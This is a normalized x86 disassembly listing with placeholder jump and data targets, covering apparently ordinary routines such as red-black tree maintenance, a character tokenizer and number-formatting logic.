mov ecx [ ebp - 0x50 ]
mov al [ edi + r--data ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x5c ]
mov [ ecx ] al
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov dl [ ebx + 0x5 ]
push 0x41
push 0x61
push 0x30
call sub_40a344
add esp 0xc
test eax eax
js r-xdata
mov esi ebx
call sub_40a3af
cmp [ ebp - 0x52 ] 0x0
jne r-xdata
mov edi [ ebp - 0x58 ]
call sub_40c11d
test al al
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x60 ] 0x0
jge r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_40487c
jmp r-xdata
test esi esi
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x5c ] 0x24
mov [ ebp - 0x49 ] 0x1
jl r-xdata
cmp [ ebp - 0x5c ] 0x24
jge r-xdata
mov eax [ ebp - 0x68 ]
mov [ ebp - 0x50 ] eax
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
cmp [ ebx + 0x4 ] al
jne r-xdata
cmp [ ebx + 0x5 ] 0x30
jne r-xdata
mov esi ebx
call sub_40a3af
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x60 ]
mov [ eax ] 0x30
jmp r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
cmp [ eax + esi ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
inc [ ebp - 0x60 ]
jmp r-xdata
mov esi ebx
mov [ ebp - 0x49 ] 0x1
call sub_40a392
mov ecx [ ebp - 0x50 ]
mov al [ eax + r--data ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x5c ]
mov [ ecx ] al
mov eax [ ebp - 0x50 ]
mov ecx [ ebp - 0x60 ]
or [ ebp - 0x4 ] 0xffffffff
mov [ eax ] 0x0
mov eax [ ebp - 0x70 ]
push 0x0
mov [ eax ] ecx
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_40487c
xor eax eax
call sub_448681
retn
cmp [ ebx + 0x5 ] 0x70
je r-xdata
mov esi ebx
call sub_40a3af
dec [ ebp - 0x60 ]
mov esi ebx
mov [ ebp - 0x49 ] 0x1
call sub_40a392
mov edi [ ebp - 0x58 ]
dec esi
je r-xdata
test esi esi
je r-xdata
cmp [ ebp - 0x51 ] 0x0
je r-xdata
cmp [ ebx + 0x5 ] 0x30
jne r-xdata
mov esi ebx
call sub_40a3af
mov esi [ ebp - 0x64 ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov esi ebx
mov [ eax ] 0x70
call sub_40a392
and [ ebp - 0x5c ] 0x0
mov [ ebp - 0x49 ] 0x0
call sub_40c11d
test al al
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
test esi esi
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x50 ]
mov al [ edi + r--data ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x5c ]
mov [ ecx ] al
cmp [ ebp - 0x5c ] 0x0
je r-xdata
cmp [ eax + esi ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
call sub_40c11d
test al al
jne r-xdata
cmp [ ebx + 0x4 ] al
jne r-xdata
cmp [ ebx + 0x5 ] 0x50
jne r-xdata
mov esi ebx
call sub_40a3af
cmp [ edx + 0x1 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + esi ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ eax + esi ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
mov al [ ebp - 0x51 ]
cmp [ ebx + 0x5 ] al
jne r-xdata
mov esi ebx
call sub_40a3af
mov esi [ ebp - 0x64 ]
mov esi ebx
call sub_40a392
mov edi [ ebp - 0x58 ]
call sub_40c11d
mov esi [ ebp - 0x64 ]
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov edi [ ebp - 0x58 ]
call sub_40c11d
test al al
je r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp [ ebx + 0x5 ] 0x2b
jne r-xdata
call sub_40a3af
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x52 ] 0x1
mov [ ebp - 0x52 ] 0x1
inc esi
jmp r-xdata
push 0x0
lea esi [ ebp - 0x2c ]
call sub_405352
inc [ ebp - 0x64 ]
inc [ eax + esi ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp [ ebx + 0x5 ] 0x30
jne r-xdata
mov esi ebx
call sub_40a3af
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x50 ]
mov [ eax ] 0x2b
jmp r-xdata
cmp [ ebx + 0x5 ] 0x30
jl r-xdata
mov esi ebx
call sub_40a3af
cmp [ ebp - 0x49 ] 0x0
je r-xdata
mov esi ebx
mov [ ebp - 0x49 ] 0x1
call sub_40a392
mov edi [ ebp - 0x58 ]
call sub_40c11d
test al al
je r-xdata
cmp [ ebx + 0x5 ] 0x2d
jne r-xdata
mov esi ebx
call sub_40a3af
inc [ ebp - 0x50 ]
mov esi ebx
call sub_40a392
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
jmp r-xdata
mov eax [ ebp - 0x50 ]
mov [ eax ] 0x2d
cmp [ ebx + 0x5 ] 0x39
jg r-xdata
mov esi ebx
call sub_40a3af
cmp [ ebp - 0x5c ] 0x8
jge r-xdata
mov esi ebx
mov [ ebp - 0x49 ] 0x1
call sub_40a392
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x50 ]
mov al [ ebx + 0x5 ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x5c ]
mov [ ecx ] al
mov esi ebx
call sub_40a3af
sub_40a167
mov ecx [ edx ]
push esi
xor esi esi
test ecx ecx
je r-xdata
mov ecx [ edx + 0x8 ]
and [ eax ] 0x0
and [ eax + 0x4 ] 0x0
dec ecx
test esi esi
je r-xdata
mov ecx [ ecx ]
test ecx ecx
je r-xdata
mov [ eax + 0x8 ] ecx
pop esi
retn
mov esi [ esi ]
test esi esi
je r-xdata
mov esi [ ecx ]
mov edx [ esi ]
mov [ eax ] edx
sub_40a1b2
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_40a1ff
push ebp
mov ebp esp
push ecx
push esi
push ecx
mov [ ebp - 0x4 ] esp
mov esi eax
mov [ ebp - 0x4 ] esp
call sub_40a6ee
mov eax esi
pop esi
leave
retn
sub_40a217
push ebp
mov ebp esp
push ecx
push edi
mov edi eax
mov ecx [ edi + 0x4 ]
mov eax [ ebp + 0x8 ]
cmp eax [ ecx ]
jne r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
cmp [ ebp + 0xc ] ecx
jne r-xdata
mov [ esi ] eax
mov eax esi
pop edi
leave
retn 0x8
push ebx
call sub_406307
mov eax [ edi + 0x4 ]
mov eax [ eax ]
jmp r-xdata
mov ebx eax
lea eax [ ebp + 0x8 ]
call sub_407f40
push ebx
lea eax [ ebp - 0x4 ]
push eax
push edi
call sub_40a472
mov eax [ ebp + 0x8 ]
cmp eax [ ebp + 0xc ]
jne r-xdata
pop ebx
sub_40a267
push ebp
mov ebp esp
push ecx
push esi
push ecx
mov [ ebp - 0x4 ] esp
mov esi eax
mov [ ebp - 0x4 ] esp
call sub_40a744
mov eax esi
pop esi
leave
retn
sub_40a283
push ebp
mov ebp esp
push ecx
push edi
mov edi eax
mov ecx [ edi + 0x4 ]
mov eax [ ebp + 0x8 ]
cmp eax [ ecx ]
jne r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
cmp [ ebp + 0xc ] ecx
jne r-xdata
mov [ esi ] eax
mov eax esi
pop edi
leave
retn 0x8
push ebx
call sub_40a71f
mov eax [ edi + 0x4 ]
mov eax [ eax ]
jmp r-xdata
mov ebx eax
lea eax [ ebp + 0x8 ]
call sub_40a30e
push ebx
lea eax [ ebp - 0x4 ]
push eax
push edi
call sub_408bfd
mov eax [ ebp + 0x8 ]
cmp eax [ ebp + 0xc ]
jne r-xdata
pop ebx
sub_40a30e
mov ecx [ eax ]
push ebx
xor bl bl
cmp [ ecx + 0x15 ] bl
jne r-xdata
pop ebx
retn
mov edx [ ecx + 0x8 ]
cmp [ edx + 0x15 ] bl
jne r-xdata
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x15 ] bl
je r-xdata
jmp r-xdata
mov edx [ eax ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov [ eax ] ecx
mov ecx [ edx ]
cmp [ ecx + 0x15 ] bl
je r-xdata
mov [ eax ] ecx
mov edx ecx
mov [ eax ] edx
pop ebx
retn
sub_40a344
push ebp
mov ebp esp
push esi
cmp [ ebp + 0x8 ] dl
jg r-xdata
cmp [ ebp + 0xc ] dl
jg r-xdata
movsx ecx [ ebp + 0x8 ]
movsx eax dl
lea esi [ ecx + 0x9 ]
cmp eax esi
jg r-xdata
cmp [ ebp + 0x10 ] dl
jg r-xdata
movsx ecx [ ebp + 0xc ]
movsx eax dl
lea esi [ ecx + 0x5 ]
cmp eax esi
jg r-xdata
sub eax ecx
jmp r-xdata
or eax 0xffffffff
movsx ecx [ ebp + 0x10 ]
movsx eax dl
lea edx [ ecx + 0x5 ]
cmp eax edx
jle r-xdata
sub eax ecx
add eax 0xa
jmp r-xdata
pop esi
pop ebp
retn
sub_40a3ef
mov ecx [ eax ]
test ecx ecx
jne r-xdata
mov edx [ ecx ]
xor edx edx
jmp r-xdata
mov edx [ edx + 0x4 ]
mov ecx [ edx + ecx * 4 ]
lea eax [ ecx + eax * 4 ]
pop esi
retn
sub ecx esi
mov eax [ eax + 0x8 ]
mov ecx eax
push esi
mov esi [ edx + 0x8 ]
shr ecx 0x2
and eax 0x3
cmp esi ecx
ja r-xdata
sub_40a41f
push 0x8
mov eax sub_44d4be
call sub_4485c8
mov esi [ ebp + 0x8 ]
push ecx
mov [ ebp - 0x14 ] esp
mov [ ebp - 0x14 ] esp
call sub_40a6ee
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp + 0xc ]
mov ecx esi
call sub_40a7f0
mov eax esi
call sub_44866d
retn 0x8
sub_40a472
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
cmp [ ebx + 0x15 ] 0x0
push esi
push edi
je r-xdata
lea eax [ ebp + 0x10 ]
call sub_407f40
mov edx [ ebx ]
cmp [ edx + 0x15 ] 0x0
je r-xdata
push r--data
call sub_446ae2
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov edi [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov edi [ eax + 0x8 ]
cmp eax ebx
jne r-xdata
mov edi edx
jmp r-xdata
cmp [ edi + 0x15 ] 0x0
mov esi [ ebx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov edx [ ebx ]
mov [ eax ] edx
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
mov [ edi + 0x4 ] esi
cmp [ edi + 0x15 ] 0x0
mov esi [ eax + 0x4 ]
jne r-xdata
mov esi eax
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi ] edi
mov edx [ ebx + 0x8 ]
mov [ eax + 0x8 ] edx
mov ecx [ ebx + 0x8 ]
mov [ ecx + 0x4 ] eax
mov [ edi + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x4 ] ebx
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi ] edi
jmp r-xdata
mov edx [ ecx + 0x4 ]
cmp [ edx ] ebx
jne r-xdata
mov ecx [ ebx + 0x4 ]
cmp [ ecx ] ebx
jne r-xdata
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x4 ]
cmp [ edx + 0x8 ] ebx
jne r-xdata
cmp [ edi + 0x15 ] 0x0
je r-xdata
mov [ ecx + 0x8 ] eax
mov [ ecx ] eax
jmp r-xdata
mov ecx [ ebx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov dl [ ebx + 0x14 ]
mov cl [ eax + 0x14 ]
mov [ eax + 0x14 ] dl
mov [ ebx + 0x14 ] cl
cmp [ ebx + 0x14 ] 0x1
jne r-xdata
cmp [ edi + 0x15 ] 0x0
je r-xdata
mov eax [ edi ]
mov ecx edi
jmp r-xdata
mov ecx esi
jmp r-xdata
lea eax [ ebx + 0xc ]
call sub_40699b
push ebx
call sub_424fc7
pop ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
pop edi
pop esi
pop ebx
test eax eax
je r-xdata
jmp r-xdata
mov eax [ edi + 0x8 ]
mov ecx edi
jmp r-xdata
mov ecx esi
jmp r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov [ edx ] ecx
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
pop ebp
retn 0xc
dec eax
mov [ ecx + 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
cmp edi [ eax + 0x4 ]
jne r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov [ edx + 0x8 ] ecx
jmp r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ edi + 0x14 ] 0x1
jne r-xdata
jmp r-xdata
mov ecx eax
mov eax [ ecx + 0x8 ]
mov [ edi + 0x14 ] 0x1
mov ecx [ esi ]
cmp edi ecx
jne r-xdata
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
mov ecx [ esi + 0x8 ]
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
mov [ ecx + 0x14 ] 0x1
mov ecx esi
mov [ esi + 0x14 ] 0x0
call sub_40a88d
mov ecx [ esi ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
mov [ ecx + 0x14 ] 0x1
mov ecx esi
mov [ esi + 0x14 ] 0x0
call sub_40a84a
mov ecx [ esi + 0x8 ]
mov edi esi
mov esi [ esi + 0x4 ]
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x14 ] 0x1
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x14 ] 0x1
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x14 ] 0x1
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x14 ] 0x1
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x14 ] 0x1
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x14 ] 0x1
je r-xdata
mov al [ esi + 0x14 ]
push [ ebp + 0x8 ]
mov [ ecx + 0x14 ] al
mov [ esi + 0x14 ] 0x1
mov eax [ ecx ]
mov ecx esi
mov [ eax + 0x14 ] 0x1
call sub_40a88d
mov eax [ ecx + 0x8 ]
push [ ebp + 0x8 ]
mov [ eax + 0x14 ] 0x1
mov [ ecx + 0x14 ] 0x0
call sub_40a84a
mov ecx [ esi ]
mov [ ecx + 0x14 ] 0x0
mov al [ esi + 0x14 ]
push [ ebp + 0x8 ]
mov [ ecx + 0x14 ] al
mov [ esi + 0x14 ] 0x1
mov eax [ ecx + 0x8 ]
mov ecx esi
mov [ eax + 0x14 ] 0x1
call sub_40a84a
jmp r-xdata
mov eax [ ecx ]
push [ ebp + 0x8 ]
mov [ eax + 0x14 ] 0x1
mov [ ecx + 0x14 ] 0x0
call sub_40a88d
mov ecx [ esi + 0x8 ]
sub_40a6cf
cmp ecx eax
je r-xdata
retn
mov edx [ ecx + 0x4 ]
push esi
mov esi [ eax + 0x4 ]
mov [ ecx + 0x4 ] esi
mov [ eax + 0x4 ] edx
mov esi [ eax + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ ecx + 0x8 ] esi
mov [ eax + 0x8 ] edx
pop esi
sub_40a6ee
and [ esi + 0x8 ] 0x0
xor eax eax
inc eax
call sub_40b7b2
mov [ esi + 0x4 ] eax
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x14 ] 0x1
mov eax [ esi + 0x4 ]
mov [ eax + 0x15 ] 0x1
mov eax esi
retn 0x4
sub_40a71f
mov eax [ edi + 0x4 ]
push esi
push [ eax + 0x4 ]
mov ecx edi
call sub_40a8ef
mov eax [ edi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0x4 ]
mov [ eax ] eax
mov esi [ edi + 0x4 ]
mov [ esi + 0x8 ] esi
and [ edi + 0x8 ] 0x0
pop esi
retn
sub_40a744
and [ esi + 0x8 ] 0x0
xor eax eax
inc eax
call sub_40b7f5
mov [ esi + 0x4 ] eax
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x14 ] 0x1
mov eax [ esi + 0x4 ]
mov [ eax + 0x15 ] 0x1
mov eax esi
retn 0x4
sub_40a7a7
push 0x4
mov eax sub_44c9ad
call sub_448595
mov esi [ ebp + 0x8 ]
push ecx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x10 ] esp
call sub_40a6ee
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
call sub_40a943
mov eax [ ebp + 0x8 ]
call sub_44866d
retn 0x8
sub_40a7f0
push ebx
push esi
push edi
mov esi ecx
mov edi [ esi + 0x4 ]
mov ebx eax
mov eax [ ebx + 0x4 ]
push edi
push [ eax + 0x4 ]
call sub_40a96d
mov [ edi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x4 ]
xor bl bl
cmp [ ecx + 0x15 ] bl
je r-xdata
mov edx [ ecx ]
cmp [ edx + 0x15 ] bl
je r-xdata
mov [ eax ] eax
mov esi [ esi + 0x4 ]
mov [ esi + 0x8 ] esi
mov ecx edx
mov [ eax ] ecx
mov esi [ esi + 0x4 ]
mov ecx [ esi + 0x4 ]
jmp r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x15 ] bl
je r-xdata
mov ecx eax
mov [ esi + 0x8 ] ecx
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_40a84a
push ebp
mov ebp esp
mov eax [ ecx + 0x8 ]
mov edx [ eax ]
mov [ ecx + 0x8 ] edx
mov edx [ eax ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x4 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x4 ] eax
jmp r-xdata
mov [ edx + 0x8 ] eax
mov [ edx ] eax
jmp r-xdata
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
sub_40a88d
push ebp
mov ebp esp
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
mov [ ecx ] edx
mov edx [ eax + 0x8 ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x4 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x4 ] eax
jmp r-xdata
mov [ edx ] eax
mov [ edx + 0x8 ] eax
jmp r-xdata
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
sub_40a8ef
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi + 0x15 ] 0x0
mov ebx ecx
mov esi edi
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
push [ esi + 0x8 ]
mov ecx ebx
call sub_40a8ef
mov esi [ esi ]
lea eax [ edi + 0x10 ]
call sub_403855
push edi
call sub_424fc7
cmp [ esi + 0x15 ] 0x0
pop ecx
mov edi esi
je r-xdata
sub_40a943
push edi
mov edi eax
cmp edi esi
je r-xdata
pop edi
retn
call sub_406307
mov ecx [ esi + 0x4 ]
mov eax [ edi + 0x4 ]
mov [ edi + 0x4 ] ecx
mov [ esi + 0x4 ] eax
mov ecx [ esi + 0x8 ]
mov eax [ edi + 0x8 ]
mov [ edi + 0x8 ] ecx
mov [ esi + 0x8 ] eax
sub_40a96d
push 0xc
mov eax sub_44c98a
call sub_4485c8
mov ebx ecx
mov [ ebp - 0x18 ] ebx
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x15 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x14 ] eax
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_44866d
retn 0x8
lea eax [ esi + 0xc ]
push eax
mov eax ebx
call sub_40b83a
mov edi eax
mov eax [ ebp + 0xc ]
mov [ edi + 0x4 ] eax
mov al [ esi + 0x14 ]
mov [ edi + 0x14 ] al
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
push edi
push [ esi ]
mov ecx ebx
call sub_40a96d
push edi
mov [ edi ] eax
push [ esi + 0x8 ]
mov ecx ebx
call sub_40a96d
mov [ edi + 0x8 ] eax
mov [ ebp - 0x14 ] edi
sub_40a9f6
push ebp
mov ebp esp
push esi
xor esi esi
push esi
call sub_40b924
cmp [ eax ] esi
jmp r-xdata
pop ecx
jne r-xdata
push esi
call sub_40b924
push [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
mov ecx [ eax ]
call sub_40d140
pop ecx
pop ecx
test al al
jne r-xdata
xor eax eax
push esi
call sub_40b924
mov ax [ eax + 0x4 ]
pop ecx
jmp r-xdata
inc esi
push esi
call sub_40b924
cmp [ eax ] 0x0
pop esi
pop ebp
retn
sub_40aa61
push ebp
mov ebp esp
push esi
xor esi esi
push esi
call sub_40b924
cmp [ eax ] esi
jmp r-xdata
pop ecx
jne r-xdata
push esi
call sub_40b924
push [ ebp + 0xc ]
mov ecx [ eax ]
push [ ebp + 0x8 ]
call sub_40d1c0
add esp 0xc
test al al
jne r-xdata
xor eax eax
push esi
call sub_40b924
mov ax [ eax + 0x4 ]
pop ecx
jmp r-xdata
inc esi
push esi
call sub_40b924
cmp [ eax ] 0x0
pop esi
pop ebp
retn
sub_40aaaa
push ebp
mov ebp esp
push edi
push esi
push [ ebp + 0x8 ]
mov edi eax
call sub_40d1fb
cmp [ eax ] esi
jne r-xdata
mov ecx [ edi ]
movsx eax [ ecx ]
cmp eax 0x3f
jg r-xdata
push 0x2f
sub eax 0x5b
je r-xdata
je r-xdata
push 0x7
jmp r-xdata
dec eax
je r-xdata
push 0x6
jmp r-xdata
cmp eax 0x24
je r-xdata
pop eax
jmp r-xdata
lea eax [ ecx + 0x1 ]
mov [ edi ] eax
cmp eax esi
je r-xdata
dec eax
dec eax
je r-xdata
pop eax
push 0x23
jmp r-xdata
cmp eax 0x28
je r-xdata
inc ecx
mov [ edi ] ecx
jmp r-xdata
push 0x2
jmp r-xdata
mov edx edi
call sub_40d26c
jmp r-xdata
push 0x22
sub eax 0x1e
je r-xdata
push 0x3
jmp r-xdata
cmp eax 0x29
je r-xdata
pop edi
pop ebp
retn 0x4
push 0x5
jmp r-xdata
xor eax eax
jmp r-xdata
push 0x4
jmp r-xdata
jle r-xdata
cmp eax 0x2b
jle r-xdata
cmp eax 0x2e
jne r-xdata
xor eax eax
inc eax
sub_40ab3c
push 0x6c
mov eax sub_44d49b
call sub_448595
mov ebx ecx
mov edi edx
push ebx
push [ ebp + 0x8 ]
call sub_40d1fb
cmp [ eax ] ebx
je r-xdata
xor eax eax
mov eax [ edi ]
cmp [ eax ] 0x3f
jne r-xdata
push ebx
push [ ebp + 0x8 ]
inc eax
mov [ edi ] eax
call sub_40d1fb
cmp [ edi ] ebx
push 0xdf
push r--data
push r--data
setne al
mov esi r--data
push esi
movzx eax al
push 0x5
push eax
call sub_403978
mov ecx [ edi ]
movsx eax [ ecx ]
add esp 0x18
cmp eax 0x3e
jg r-xdata
sub eax 0x50
je r-xdata
je r-xdata
push ebx
push [ ebp + 0x8 ]
inc ecx
mov [ edi ] ecx
call sub_40d1fb
cmp [ edi ] ebx
push 0x100
push r--data
push r--data
setne al
push esi
movzx eax al
push 0x5
push eax
call sub_403978
mov eax [ edi ]
movsx ecx [ eax ]
add esp 0x18
sub ecx 0x3c
je r-xdata
dec eax
dec eax
je r-xdata
push 0x19
jmp r-xdata
sub eax 0x21
je r-xdata
push [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
inc eax
mov [ edi ] eax
mov eax edi
call sub_40d2bf
mov eax [ edi ]
cmp eax ebx
je r-xdata
dec ecx
je r-xdata
push 0x1b
jmp r-xdata
sub eax 0x17
je r-xdata
inc ecx
pop eax
mov [ edi ] ecx
jmp r-xdata
push 0x16
jmp r-xdata
dec eax
dec eax
je r-xdata
xor al al
mov cl [ eax ]
inc eax
mov [ edi ] eax
cmp cl 0x3e
jne r-xdata
push [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
inc eax
mov [ edi ] eax
mov eax edi
call sub_40d2bf
cmp [ edi ] ebx
push 0x109
push r--data
push r--data
setne al
push r--data
movzx eax al
push 0x5
push eax
call sub_403978
add esp 0x18
push 0x1f
jmp r-xdata
push 0x7
mov eax r--data
lea esi [ ebp - 0x78 ]
call sub_4038f9
mov [ ebp - 0x4 ] 0x1
push 0x10c
jmp r-xdata
push ebx
push [ ebp + 0x8 ]
mov ecx edi
call sub_40d340
jmp r-xdata
sub eax 0x4
je r-xdata
call sub_44866d
retn 0x8
push 0x1a
jmp r-xdata
dec eax
je r-xdata
pop eax
jmp r-xdata
mov al 0x1
jmp r-xdata
push r--data
push r--data
push eax
call sub_405e22
sub eax 0x6
je r-xdata
push [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
inc ecx
mov eax edi
mov [ edi ] ecx
call sub_40d2bf
cmp [ edi ] ebx
push 0xeb
push r--data
push r--data
setne al
push r--data
movzx eax al
push 0x5
push eax
call sub_403978
mov ecx [ edi ]
add esp 0x18
cmp [ ecx ] 0x3d
jne r-xdata
sub eax 0x9
je r-xdata
push 0x105
push r--data
push r--data
push r--data
push 0x5
push eax
call sub_403978
add esp 0x18
push 0x1e
jmp r-xdata
sub eax 0x5
je r-xdata
push 0x1d
push 0x1c
jmp r-xdata
sub eax 0xd
je r-xdata
push 0x7
mov eax r--data
lea esi [ ebp - 0x54 ]
call sub_4038f9
mov [ ebp - 0x4 ] 0x2
push 0x117
jmp r-xdata
push 0x14
dec eax
dec eax
je r-xdata
push ebx
push [ ebp + 0x8 ]
inc ecx
mov [ edi ] ecx
call sub_40d1fb
cmp [ edi ] ebx
push 0xf5
push r--data
push r--data
setne al
push esi
movzx eax al
push 0x5
push eax
call sub_403978
mov ecx [ edi ]
mov al [ ecx ]
add esp 0x18
cmp al 0x21
je r-xdata
dec eax
jne r-xdata
push 0x18
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x15
jmp r-xdata
push 0x17
jmp r-xdata
push 0x7
mov eax r--data
lea esi [ ebp - 0x30 ]
call sub_4038f9
and [ ebp - 0x4 ] 0x0
push 0xfb
sub_40adf5
push 0xa4
mov eax sub_44e38e
call sub_4485fe
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x58 ] eax
mov eax [ ebp + 0xc ]
mov esi edx
mov [ ebp - 0x68 ] eax
mov eax [ eax ]
mov [ esi ] 0x1
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x50 ] ecx
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x4c ] eax
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x60 ] 0x1
mov edi [ ebp - 0x50 ]
lea eax [ ebp - 0x4c ]
